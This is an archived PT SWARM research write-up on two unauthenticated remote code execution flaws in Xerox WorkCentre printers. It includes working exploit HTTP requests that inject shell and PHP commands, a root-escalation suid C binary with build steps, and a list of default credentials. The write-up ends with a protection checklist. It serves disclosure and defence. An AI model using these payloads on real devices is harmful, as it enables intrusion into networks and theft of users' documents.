---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-28_inside-xerox-workcentre-two-unauthenticated-rces.md
original_filename: 2024-06-28_inside-xerox-workcentre-two-unauthenticated-rces.md
title: 'Inside Xerox WorkCentre: Two Unauthenticated RCEs'
category: documents
detected_topics:
- command-injection
- sso
- access-control
- mfa
tags:
- imported
- documents
- command-injection
- sso
- access-control
- mfa
language: en
raw_sha256: 152af38d068bee20a4f34613d67c6345361fc820c31911a03aa7226495caef2e
text_sha256: 4168e9dc2cff73ca3cd3cb25afa73d98c0f92f020e1499df7e2ecff4f02a67c1
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Inside Xerox WorkCentre: Two Unauthenticated RCEs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-28_inside-xerox-workcentre-two-unauthenticated-rces.md
- Source Type: markdown
- Detected Topics: command-injection, sso, access-control, mfa
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `152af38d068bee20a4f34613d67c6345361fc820c31911a03aa7226495caef2e`
- Text SHA256: `4168e9dc2cff73ca3cd3cb25afa73d98c0f92f020e1499df7e2ecff4f02a67c1`


## Content

---
title: "Inside Xerox WorkCentre: Two Unauthenticated RCEs"
page_title: "Inside Xerox WorkCentre: Two Unauthenticated RCEs – PT SWARM"
url: "https://swarm.ptsecurity.com/inside-xerox-workcentre-two-unauthenticated-rces/"
final_url: "https://swarm.ptsecurity.com/inside-xerox-workcentre-two-unauthenticated-rces/"
authors: ["Arseniy Sharoglazov (@_mohemiv)"]
programs: ["Xerox"]
bugs: ["RCE", "Local Privilege Escalation", "Printer hacking", "Security code review"]
publication_date: "2024-06-28"
added_date: "2024-07-01"
source: "pentester.land/writeups.json"
original_index: 217
---

# Inside Xerox WorkCentre: Two Unauthenticated RCEs

Written by [Arseniy Sharoglazov](https://swarm.ptsecurity.com/author/arseniy-sharoglazov/ "Posts by Arseniy Sharoglazov") on June 28, 2024

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/06/f43178ab-xerox-preview-3.png)

## Author

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/07/foto_arseniy-150x150.jpg)

[Arseniy Sharoglazov](https://swarm.ptsecurity.com/author/arseniy-sharoglazov/ "Posts by Arseniy Sharoglazov")

Penetration Testing Expert 

[_mohemiv](https://twitter.com/_mohemiv "Visit Arseniy Sharoglazov’s Twitter")

Every organization has printers. Sometimes, there are Xerox WorkCentre among them, large machines that can weigh more than 100 kilos or 220 lbs.

In this writeup, I will cover two unauthenticated RCE vulnerabilities that I discovered in these printers. Next, I’ll provide a checklist for protecting your printers against attacks.

## Initial Discovery

Here is a screenshot of the main page of Xerox WorkCentre:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/06/8da0f7b2-Screenshot-from-2024-06-03-19-33-36.png)The main page of Xerox WorkCentre

This web page can be on port 80/http by default, or on port 443/https if a TLS certificate is set up.

Be careful when scanning for printers. Scanning special ports, such as 631/tcp (IPP), can result in the accidental printing of numerous documents.

## Firmware

The firmware for Xerox WorkCentre can be easily downloaded from the official Xerox’s website.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/06/9dc7e123-WorkCentre_firmware.png)One of the pages where Xerox WorkCentre firmware can be downloaded

Next, it can be unpacked with a series of `unzip`, `binwalk -e`, and `tar xf` commands.

## Unauthenticated RCE #1

**Assigned CVE:** CVE-2016-11061

Xerox had patched the issue in 2016, but they did not issue a CVE for it at that time. Therefore, when the issue was rediscovered in 2020, we were able to assign the CVE-2016-11061 identifier for it.

The vulnerability consists of simple shell escaping in configrui.php file:
  
  
  <?php
  
  $req=$_POST['req'];
  $param=$_POST['param'];
  $block=escapeshellcmd($_POST['block']);
  $user=escapeshellcmd($_POST['username']);
  $isActive=escapeshellcmd($_POST['isActive']);
  $isOverride=escapeshellcmd($_POST['isOverride']);
  
  function startRUI($p,$bl,$us,$i,$active,$ov)
  {
  // [REDACTED]
  
  if ("1" === $ov) {
  $reply1 = "ruiAccessResponse ACCEPT";
  } else {
  // [REDACTED]
  }
  
  if (strncmp($reply1,'ruiAccessResponse ACCEPT', 24) === 0) {
  $reply2=exec("/opt/ui/remoteUI/bin/config_remoteui startRUI $p $_SERVER[SERVER_ADDR]");
  if (strncmp($reply2,'<PARAM',6) === 0){
  #write out session data to ramdisk...
  system("echo \"$bl,$ov,$us,$i\" > /tmp/semFiles/rui_session");
  }
  echo $reply2;
  }
  // [REDACTED]
  }
  
  if  ("config" === $req) {
  echo $req;
  startRUI($param,$block,$user,$ip,$isActive,$isOverride);
  }
  
  // [REDACTED]

Attackers can easily exploit it by sending the following HTTP request:
  
  
  POST /support/remoteUI/configrui.php HTTP/1.1
  Host: 192.168.0.10
  User-Agent: Mozilla/5.0
  Accept: text/html
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: [REDACTED]
  
  req=config&isOverride=1&param=`cmd+to+execute`

Despite the patch being released in 2016, we still encounter 2016 and earlier firmware versions in use during internal pentests to this day.

## Unauthenticated RCE #2

**Assigned CVE:** N/A

In 2023, I first encountered a patched Xerox device that wasn’t affected by CVE-2016-11061. I quickly downloaded the new firmware and examined the patch:
  
  
  <?php
  
  $req = $_POST['req'];
  $block = escapeshellcmd($_POST['block']);
  $user = escapeshellcmd($_POST['username']);
  $isActive = escapeshellcmd($_POST['isActive']);
  $isOverride = escapeshellcmd($_POST['isOverride']);
  
  // [REDACTED]

Clearly, nothing more could be done. Xerox simply removed `$_POST['param']` from the code, eliminating the parameter that allowed for shell injection.

However, I carefully inspected the preprocessor directives found in some of the PHP files:
  
  
  ...
  
  <?php
  if ( true == $gdisplayScanPreset )
  {
  ?>
  var CUSTOM_CHOICE  = "custom";
  <?php
  }
  ?>
  
  <script type="text/javascript">
  // [REDACTED]
  
  // global variables
  var gCurrentValidationServerPath  = "";
  var gCurrentValidationServerProtocol  = '<!-- loa fn=HTTP_Parser_Get_fn arg="xrx_svc_validation 1 MetaDataValidationServerProtocol string" context="js" -->';
  var gDocumentInvocations  = '<!-- loa fn=HTTP_Parser_List_Invocations_fn arg="xrx_document" context="js" -->';
  
  // [REDACTED]
  </script>
  
  ...
  

These preprocessor directives are generated by the C code, which is loaded as an Apache module, before the PHP code is executed.

After finding the right place to inject the code, I quickly obtained RCE:
  
  
  POST /userpost/xerox.set HTTP/1.1
  Host: 192.168.0.10
  User-Agent: Mozilla/5.0
  Content-Type: application/x-www-form-urlencoded
  Content-Length: [REDACTED]
  
  _fun_function=HTTP_Parser_Set_fn&DefaultParserFilename=%2Ftmp%2Ftemplate%2Fpool%2Fsystem%2FDEFAULT.XST&NextPage=%2Fscan%2Ftemplate.php%3FParserFilename%3D%2Ftmp%2Ftemplate%2Fpool%2Fweb%2Fabc.XST&ServiceName=xrx_svc_validation&InvocationName=1&AttributeName=MetaDataValidationServerProtocol&AttributeType=string&AttributeValue=111111111%0A%0A%0A<?php+echo+system("ifconfig");exit;?>%0A%0A222222222&Action=update&CopyParserFilename=abc.XST

This vulnerability can be tricky to reproduce. The Apache module is sensitive to input parameters, including their order. There may be differences between Xerox models, and the module also has caching.

To exploit it, it’s easier to intercept the request from the interface below, which is accessible from the main page without any authentication, and modify the MetaDataValidationServerProtocol attribute:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/06/2b48fd27-templates.png)

We reported this vulnerability to Xerox in June 2023, along with two unauthenticated buffer overflows I accidentally found. According to Xerox, all reported vulnerabilities were fixed that same month. However, no security bulletins or CVEs were issued or found on the Xerox website.

Since Xerox is currently a CNA, we can’t request a CVE for these issue ourselves.

## Privilege Escalation and USB interface

Privilege escalation on Xerox WorkCentre is straightforward because every daemon on the device, except for Apache and PostgreSQL, runs under the root privileges.

I can’t disclose the exact method to escalate privileges, but I can share the C code for the suid binary:
  
  
  #define _GNU_SOURCE
  #include <unistd.h>
  #include <sys/syscall.h>
  #include <sys/types.h>
  
  int _start(void) {
  asm volatile ("mr 3, 1;"
  "bl __main;");
  }
  
  int __main(void *sp[])
  {
  syscall(SYS_setuid, 0, 0, 0);
  syscall(SYS_setgid, 0, 0, 0);
  
  syscall(SYS_execve, sp[2], &sp[2], 0);
  
  return 0;
  }

The custom _start function isn’t necessary, but it significantly reduces the output file size.

This suid code should be compiled with [musl-cross-make](https://github.com/richfelker/musl-cross-make):
  
  
  powerpc-linux-musl-gcc -O2 -nostartfiles -static ./suid.c
  powerpc-linux-musl-strip ./a.out
  powerpc-linux-musl-strip -R .comment ./a.out

The resulting binary can be used on many PowerPC devices to facilitate privilege escalation.

After gaining root privileges, the `/tmp/usb-sdb1` directory can be accessed, where all external USB devices are mounted. Next, a user’s DOCX or PDF file might be downloaded or altered to continue the attack, even if the printer segment is isolated.

## Protection Checklist

**1.** Update your Xerox WorkCentre to the latest firmware.

**2.** Verify that your devices do not use the default credentials:
  
  
  admin:admin
  admin:1111
  diag:3424
  !$ecivreS:2732
  forceonboxlogin:password
  guest:2222

**3.** Set strong password for the administrator account, different from other devices.

**4.** If you use a mailbox account on the device to send mail with scanned documents, verify that the mailbox is properly cleared and doesn’t accumulate confidential documents.

**5.** Properly isolate your printers in your local network.

## Read More

**1.** Raphaël Rigo, 2020: <https://airbus-seclab.github.io/xerox/INFILTRATE2020-RIGO-Xerox-final.pdf>

**2.** Nicolas Heiniger, 2021: <https://www.compass-security.com/fileadmin/Research/Advisories/2021-04_CSNC-2021-002_OS_command_injection_RCE_in_Xerox_WorkCentre.txt>

**3.** Rik van Duijn, 2021: <https://zolder.io/decrypt-passwords-from-xerox-workcentre-config-backups/>

**4.** Brendan O’Connor, 2006: <https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-OConnor.pdf>

Feel free to write your thoughts about the writeup [on our X page](https://twitter.com/ptswarm). Follow [@ptswarm](https://twitter.com/ptswarm) or [@_mohemiv](https://twitter.com/_mohemiv) so you don’t miss our future research and other publications.

[Penetration Testing](https://swarm.ptsecurity.com/tag/penetration-testing/), [RCE](https://swarm.ptsecurity.com/tag/rce/), [Web Application Security](https://swarm.ptsecurity.com/tag/web-application-security/)
